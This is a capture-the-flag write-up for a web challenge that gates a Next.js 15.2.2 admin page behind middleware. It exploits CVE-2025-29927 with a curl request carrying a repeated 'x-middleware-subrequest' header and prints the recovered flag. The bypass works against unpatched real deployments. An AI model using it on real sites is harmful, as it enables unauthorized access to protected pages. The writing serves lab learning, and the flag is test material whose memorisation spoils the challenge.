# EPIC CAKE BATTLES OF HISTORY!!!

```
Difficulty: Medium
Author: Emil8250

After all this time, it's finally time to figure out which cake is best: BRUNSVIGER VS. OTHELLO! BEGIN!
```

In the attachment:

```json
// package.json
{
  "name": "epic-cake-battles",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "dev": "next dev --turbopack",
    "build": "next build",
    "start": "next start",
    "lint": "next lint"
  },
  "dependencies": {
    "next": "15.2.2",
    "react": "^19.0.0",
    "react-dom": "^19.0.0"
  },
  "devDependencies": {
    "@tailwindcss/postcss": "^4",
    "@types/node": "^20",
    "@types/react": "^19",
    "@types/react-dom": "^19",
    "tailwindcss": "^4",
    "typescript": "^5"
  }
}
```

```javascript
// src/middleware.ts
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'
 
// This function can be marked `async` if using `await` inside
export function middleware(request: NextRequest) {
  // @ts-ignore
    if("CHAMPION" == "FOUND")
        return NextResponse.redirect(new URL('/admin', request.url))
  return NextResponse.redirect(new URL('/', request.url))
}
 
// See "Matching Paths" below to learn more
export const config = {
  matcher: '/admin/:path*',
}
```

```javascript
// src/app/admin/page.tsx
export default function Home() {
    const flag = "brunner{REDACTED}"
  return (
        <span>{flag}</span>
  );
}
```

It hints that we need to bypass the middleware to access the admin page. Searching Next.js 15.2.2 leads to [CVE-2025-29927: Next.js Middleware Authorization Bypass - Technical Analysis](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass).

We just following the descriptions in the blog (in `For versions 13.2.0 and later:` part), by adding `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` header:

```shell
curl -v https://epic-cake-battles-f4c2a78204e26004.challs.brunnerne.xyz/admin -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
```

The flag is shown: `brunner{0th3llo-iz-b3st-cake}`
